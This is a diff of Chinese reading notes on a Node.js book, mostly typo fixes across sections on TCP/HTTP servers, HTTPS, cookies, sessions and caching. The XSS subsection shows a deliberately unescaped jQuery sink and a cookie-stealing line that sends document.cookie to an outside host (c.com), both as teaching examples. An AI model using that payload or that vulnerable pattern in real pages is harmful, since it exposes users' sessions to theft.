@@ -2,12 +2,19 @@
 > 该书不仅讲解了node.js方面的知识，对于了解与巩固网络传输方面的知识也有很大帮助，对前端开发来说，太棒了~
 
 - [第一章 Node简介](https://github.com/xblcity/reading-notes/blob/master/books/node.md#第一章-node简介)
+
 - [第二章 Node简介](https://github.com/xblcity/reading-notes/blob/master/books/node.md#第二章-模块机制)
+
 - [第三章 异步I/O](https://github.com/xblcity/reading-notes/blob/master/books/node.md#第三章-异步I/O)
+
 - [第四章 异步编程](https://github.com/xblcity/reading-notes/blob/master/books/node.md#第四章-异步编程)
+
 - [第五章 内存控制](https://github.com/xblcity/reading-notes/blob/master/books/node.md#第五章-内存控制)
+
 - [第六章 理解Buffer](https://github.com/xblcity/reading-notes/blob/master/books/node.md#第六章-理解Buffer)
+
 - [第七章 网络编程](https://github.com/xblcity/reading-notes/blob/master/books/node.md#第七章-网络编程)
+
 - [第八章 构建Web应用](https://github.com/xblcity/reading-notes/blob/master/books/node.md#第八章-构建Web应用)
 
 :smile: :smiley: :innocent:
@@ -404,8 +411,9 @@ server.listen(8000, function() {
 **close**: 该事件在服务器关闭时触发，在调用server.close()后，服务器将停止接收新的套接字连接，但保护当前存在的连接，等待所有连接都断开后，会触发该事件。  
 **error**: 该事件在服务器发生异常时，将会触发该事件，比如侦听一个使用中的端口，将会触发一个异常，如果不侦听error事件，服务器将会抛出异常。
 
-##### 2.连接事件
-服务器可以同时与多个客户端保持连接，对于每个连接而言是典型的可读可写Stream对象。Stream对象可以用于服务器端和客户端之间的通信，既可以通过data事件从一段读取另一端发来的数据，也可以通过write()方法从一端向另一端发送数据。它有如下自定义事件。  
+##### 2.连接事件(本例可以理解为socket上的事件)
+服务器可以同时与多个客户端保持连接，对于每个连接而言是典型的可读可写**Stream对象**。**Stream对象**可以用于服务器端和客户端之间的通信，既可以通过data事件从一段读取另一端发来的数据，也可以通过write()方法从一端向另一端发送数据。它有如下自定义事件。  
+
 **data**: 当一端调用write()发送数据时，另一端会触发data事件，事件传递的数据即是write()发送的数据  
 **end**: 当连接中的任意一端发送了FIN数据时，将会触发该事件。  
 **connect**: 该事件用于客户端，当套接字与服务器连接成功时会被触发  
@@ -442,13 +450,13 @@ http.createServer(function(req, res) {
 #### 7.3.1 HTTP
 HyperText Transfer Protocol，超文本传输协议,HTTP构建在TCP之上，属于应用层协议，在HTTP的两端是服务器和浏览器，即著名的B/S模式，如今精彩纷呈的Web即是HTTP的应用。(app也是HTTP应用)
 
-现在的应用，如浏览器，其实是一个HTTP的代理，用户的行为将会通过它转换为HTTP请求报文发送给服务器端，服务器端在处理请求后，发送响应报文给代理，代理在解析报文后，将用户需要的内容呈现在界面上。
+现在的应用，如浏览器，其实是一个**HTTP的代理**，用户的行为将会通过它转换为HTTP请求报文发送给服务器端，服务器端在处理请求后，发送响应报文给代理，代理在解析报文后，将用户需要的内容呈现在界面上。
 
-在linux命令行，可以使用 curl发送get请求  
+在linux命令行，可以使用 curl发送请求  
 // HTTP报文，todo
 #### 7.3.2 http模块
-在Node中,HTTP服务继承自TCP服务(net模块),它能够与多个客户端保持连接，由于其采用事件驱动的形式，并不为每一个连接创建额外的线程或进程，保持很低的内存占用，所以能实现高并发。HTTP服务于TCP服务模型由区别的地方在于，在开启keeplive后，一个TCP会话可以用于多次请求和相应，TCP服务以connnection为单位进行u、服务，HTTP服务以request为单位进行服务，http模块即使将connection到request的过程进行了封装。  
-在请求产生的过程中，http模块那大连接中传来的数据，调用二进制模块http_parser进行解析，在解析完请求报文的报头后，触发request事件，调用用户的业务逻辑
+在Node中,HTTP服务继承自TCP服务(net模块),它能够与多个客户端保持连接，由于其采用事件驱动的形式，并不为每一个连接创建额外的线程或进程，保持很低的内存占用，所以能实现高并发。HTTP服务于TCP服务模型由区别的地方在于，在开启keep-alive后，一个TCP会话可以用于多次请求和相应，TCP服务以connection为单位进行u、服务，HTTP服务以request为单位进行服务，http模块即使将connection到request的过程进行了封装。  
+在请求产生的过程中，http模块那大连接中传来的数据，调用二进制模块http_parser进行解析，**在解析完请求报文的报头后，触发request事件，调用用户的业务逻辑**
 
 **HTTP请求**  
 req.method: 请求方法，值为GET，POST,DELETE,PUT.CONNECT等  
@@ -457,18 +465,19 @@ req.httpVersion: 1.1等
 其余报头会议上股个别规律的key:value格式，在解析后方盒子在req.headers属性上传递给业务逻辑以供调用
 
 **HTTP响应**  
-响应头部信息的API：req.setHead, req.setHeader  
+响应头部信息的API：req.setHead,(这个貌似没找到用处?) req.setHeader  
 
 如同TCP服务一样，http服务器也抽象了一些时间，以供应用层使用，服务器也是一个EventEmitter实例。  
-connnection事件：在开始http请求和响应前，客户端与服务器端需要建立底层的TCP连接，这个连接可能因为开启了keep-alive，可以在多次请求响应之间使用，当这个连接建立时，服务器触发一次connection事件。  
+connection事件：在开始http请求和响应前，客户端与服务器端需要建立底层的TCP连接，这个连接可能因为开启了keep-alive，可以在多次请求响应之间使用，当这个连接建立时，服务器触发一次connection事件。  
 request事件：建立TCP连接后，http模块底层将在数据流中抽象出HTTP请求和HTTP响应，当强求数据发送到服务器端，在解析出HTTP请求头后，将会触发该事件，在res.end()后，TCP连接可能将用于下一次请求响应。  
-close事件：与TCPP服务器的行为一致。  
+close事件：与TCP服务器的行为一致。  
 checkContinue事件： 。。。  
 connect事件：  
 upgrade事件：  
 clientError事件
+
 #### 7.3.3 HTTP客户端
-即用于发送请求的一段，node模块提供的api为: http.request(options,connect),用于构造http客户端，与curl命令大致相同
+即用于**发送请求**的一段，node模块提供的api为: http.request(options,connect),用于构造http客户端，与curl命令大致相同
 ```js
 var options = {
   hostname: '127.0.0.1',
@@ -523,22 +532,26 @@ socket.onopen = function() {
 服务器端。 // Todo
 
 ### 7.5 网络服务与安全
+
 为防止数据被监听，我们需要将数据加密后再进行网络传输，但是对于应用层而言，如HTTP，FTP等，我们仍希望能够透明的处理数据，而无需操心网络传输过程中的安全问题。  
 SSL Secure Sockets Layer，安全嵌套层，SSL作为一种安全协议，它在传输层提供对网络连接加密的功能。对于应用层而言，它是透明的，数据在传递到应用层之前就已经完成了加密和解密的过程。最初的SSL应用在Web上，被放服务器端和浏览器端同时支持，对吼IEIF将其标准化，成为TLS(Transport Layer Security, 安全传输层协议)   
 Node在网络安全上提供了3个模块，分别为crypto, tls, https.其中crypto主要用于加密解密，SHAI,MD5等加密算法都在其中有体现，真正用于网络的是另外两个模块，tls模块提供了与net模块类似的功能，区别在于它建立在TLS/SSL加密的TCP连接上，对于https而言，它完全与http模块接口一致，区别也仅在于它建立安全的连接之上。
+
 #### 7.5.1 TLS/SSL
 1. 秘钥
 TLS/SSL是一种公钥/私钥的结构，它是一个非对称结构，每个服务器端和客户端都有自己的公私钥，公钥用来加密要传输的数据，私钥用来解密接收收到的数据
 // Todo
 2. 数字证书
 // Todo Todo
+
 #### 7.5.2 TLS服务
 利用tls模块，在创建server的时候需要传入一个options的对象参数，其中包含CA证书
+
 #### 7.5.3 HTTPS服务
 HTTPS服务就是工作在TLS/SSL上的HTTP  
 创建HTTPS服务
 ```js
-var https = require('htpps')
+var https = require('https')
 var fs = require('fs')
 var options = {
   key: fs.readFileSync('./keys/server.key'),
@@ -551,6 +564,7 @@ http.createServer(options, function(req, res) {
 }).listen(8000)
 ```
 HTTPS客户端，也需要指定证书的相关参数 // Todo
+
 ### 7.6 总结
 Node基于事件驱动和非阻塞设计，在分布式环境中尤其能发挥出它的特长，基于事件驱动可以实现与大量的客户端进行对接，非阻塞设计则可以让它更好的提升网络的响应吞吐，Node提供了相对底层的网络调用，以及基于事件的编程接口，使得开发者在这些模块上十分轻松的构建网络应用
 
@@ -569,7 +583,7 @@ http.createServer(function() {
   console.log('服务启动啦~')
 })
 ```
-对于一个Web应用而言，仅仅只是上面这样的响应圆管达不到业务的需求，在具体的业务中，我们可能会有如下这些需求。
+对于一个Web应用而言，仅仅只是上面这样的响应远远达不到业务的需求，在具体的业务中，我们可能会有如下这些需求。
 
 - 请求方法的判断
 - URL的路径解析
@@ -603,13 +617,13 @@ function (req, res) {
 
 #### 8.1.2 路径解析
 HTTP_Parser将其解析为req.url, hash部分会被丢掉  
-一种比较常见的是根据路径进行业务员处理的应用是静态文件服务器，还有一种是根据路径来选择控制器
+一种比较常见的是根据路径进行业务处理的应用是静态文件服务器，还有一种是根据路径来选择控制器
 
 #### 8.1.3 查询字符串
-在地址栏路径后的`?foo=bar&baz=val`可以使用node核心模块querystring，当然更简洁的方法是使用引入核心模块url,`url.parse(req.url,true).query`
+在地址栏路径后的`?foo=bar&baz=val`可以使用node核心模块querystring，`querystring.parse(req.url.split(?)[1])`, 当然更简洁的方法是使用引入核心模块url,`url.parse(req.url,true).query`
 
 #### 8.1.4 Cookie
-HTTP是无状态的，现实中的圆舞曲却需要一定的状态，如何标识和认证一个用户，最早的方案就是Cookie了
+HTTP是无状态的，现实中的应用却需要一定的状态，如何标识和认证一个用户，最早的方案就是Cookie了
 
 Cookie的处理分为如下几步：  
 - 服务端向客户端发送Cookie
@@ -637,7 +651,7 @@ var parseCookie = function(cookie) {
 响应字段在Set-Cookie里面，例如`Set-Cookie: name=value; Path=/; Expires=Sun, 23-Apr-23 09:01:35 GMT; Domain=domian.com`,主要选项
 
 - path，表示cookie影响到的路径
-- Expires和Max-Age告知浏览器合适过期
+- Expires和Max-Age告知浏览器何时过期
 - HttpOnly，告知浏览器不可以通过脚本`document.cookie`去更改cookie值
 - Secure: 当设置为true只有在HTTPS中才有效
 
@@ -647,18 +661,18 @@ Cookie的性能问题：cookie在发送每次请求都会被带到服务端，�
 - 减少DNS查询？
 
 #### 8.1.5 Session
-通过Cookie，浏览器和服务器可以实现状态的记录，但是Cookie并非是完美的，前文提及的体积过大就是一个显著的问题，最为严重的问题是Cookie可以在前后端进行修改，因此数据就极容易被篡改和伪造。如果服务端有部分逻辑是根据Cookie中的isVIP字段进行判断，name一个普通用户通过修改Cookie就可以轻松享受到VIP服务了，综上所述，Cookie对于敏感数据的保护是无效的。
+通过Cookie，浏览器和服务器可以实现状态的记录，但是Cookie并非是完美的，前文提及的体积过大就是一个显著的问题，最为严重的问题是Cookie可以在前后端进行修改，因此数据就极容易被篡改和伪造。如果服务端有部分逻辑是根据Cookie中的isVIP字段进行判断，那么一个普通用户通过修改Cookie就可以轻松享受到VIP服务了，综上所述，Cookie对于敏感数据的保护是无效的。
 
-为了解决Cookie敏感数据的问题，Session应运而生。Session的数据值保留在服务器端，客户端你无法修改，这样数据的安全性得到一定的保障，数据也无需在协议中每次都被传递。
+为了解决Cookie敏感数据的问题，Session应运而生。Session的数据值保留在服务器端，客户端无法修改，这样数据的安全性得到一定的保障，数据也无需在协议中每次都被传递。
 
 虽然在服务端存储数据十分方便，但是如何将每个客户和服务器中的数据一一对应起来，这里有常见的两种实现方式。
 
 1. 基于Cookie来实现用户和数据的映射
-将口令妨碍Cookie里面，口令如何产生？一般服务器端会约定一个键值作为Session的口令，这个值可以随意约定，比如Connect默认采用connect_uid，一旦服务器检查到用户请求Cookie中没有携带该值，它就会为之生成一个值，这个值是唯一且不重读的值，并设置超时时间。以下为生成session的代码：
+将口令放在Cookie里面，口令如何产生？一般服务器端会约定一个键值作为Session的口令，这个值可以随意约定，比如Connect默认采用connect_uid，一旦服务器检查到用户请求Cookie中没有携带该值，它就会为之生成一个值，这个值是唯一且不重读的值，并设置超时时间。以下为生成session的代码：
 ```js
 var sessions = {}
 var key = 'session_id'
-var EXPRIES = 20*60*1000
+var EXPIRES = 20*60*1000
 
 var generate = function() {
   var session = {}
@@ -731,14 +745,16 @@ var handle = function(req, res) {
 
 在上面的示例代码中，我们都将Session数据直接存在了变量sessions中，它位于内存中，然而在第五章的内存控制部分，我们分析了为什么Node会存在内存限制，这里将数据存放在内存中将会带来极大的隐患，如果用户增多，我们很可能就接触到了内存限制的上限，并且内存中的数据量加大，必然会因此垃圾回收的频繁扫描，引起性能问题。  
 另一个问题则是我们可能为了利用多核CPU而启动多个进程，用户请求的连接将可能随意分配到各个进程中，Node的进程与进程之间是不能直接共享内存的，用户的Session可能会有引起错乱。  
-为了解决性能问题和Session数据无法跨进程共享的问题，常见的方案是将session集中化，将原本可能分散在多个进程里的数据，统一转移到集中的数据存储中，目前常用的工具是Redis、Memcached等。通过这些高效地缓存，Node进程无需在内部维护数据对象，垃圾回收问题和内存限制问题都可以迎刃而解，并且这些告诉缓存设计的缓存过期策略更合理高效，比在Node中自行设计缓存策略更好。  
+
+为了解决性能问题和Session数据无法跨进程共享的问题，常见的方案是将session集中化，将原本可能分散在多个进程里的数据，统一转移到集中的数据存储中，目前常用的工具是Redis、Memcached等。通过这些高效地缓存，Node进程无需在内部维护数据对象，垃圾回收问题和内存限制问题都可以迎刃而解，并且这些告诉缓存设计的缓存过期策略更合理高效，比在Node中自行设计缓存策略更好。
+
 尽管采用专门的缓存服务回避直接在内存中访问慢，但其影响小之又小，带来的好处远远大于直接在Node中存储数据。
 
 Session安全：通过私钥加密进行签名
 
 ##### 安全问题
 XSS漏洞  
-全称Cross-Site Scripting 跨站脚本攻击。XSS漏洞会让背的脚本执行，它的形成原因多数是用户的输入没有被转义，而被直接执行，比如某个网站的前端脚本，它会将URL hash中的值设置到页面中，以实现某种逻辑，如下所示
+全称Cross-Site Scripting 跨站脚本攻击。XSS漏洞会让本地脚本执行，它的形成原因多数是用户的输入没有被转义，而被直接执行，比如某个网站的前端脚本，它会将URL hash中的值设置到页面中，以实现某种逻辑，如下所示
 ```js
 $('#box').html(location.hash.replace('#', ''))
 ```
@@ -760,6 +776,7 @@ location.href = 'http://c.com/?' + document.cookie
 
 #### 8.1.6 缓存
 通常来说，POST, DELETE, PUT这类带行为性的请求操作一般不做任何缓存，大多数缓存值应用在GET请求中。一般可以通过添加`Expires Cache-Control Etags`来实现缓存
+
 | 服务端 | 客户端 |
 | ---    |  ---  |
 | Last-Modefied | If-Modefied-Since |
@@ -776,7 +793,7 @@ Basic认证是当客户端与服务器端进行请求时，允许通过用户名
 Node的http模块支队HTTP报文的头部进行了解析，然后出发request事件，如果请求中海油内容部分(如POST请求，它具有请求和内容)，内容部分需要用户自行接收和解析，通过报头的`Transfer-Encoding`或`Content-Length`即可判断请求是否带有内容。如下:
 ```js
 var hasBody = function(req) {
-  return `transfer-encoding` in req.headers || 'content-lenght' in req.headers
+  return `transfer-encoding` in req.headers || 'content-length' in req.headers
 }
 ```
 在HTTP_Parser解析报头结束后，报文内容部分会通过data事件触发，我们只需以流的方式处理即可，如下所示:  
@@ -796,5 +813,5 @@ function(req, res) {
   }
 }
 ```
-在接收到的Buffer列表转化为一个Buffer对象后，再装换为没有乱码的字符串，暂时挂置在req.rawBody处。
+在接收到的Buffer列表转化为一个Buffer对象后，再转换为没有乱码的字符串，暂时挂置在req.rawBody处。
 
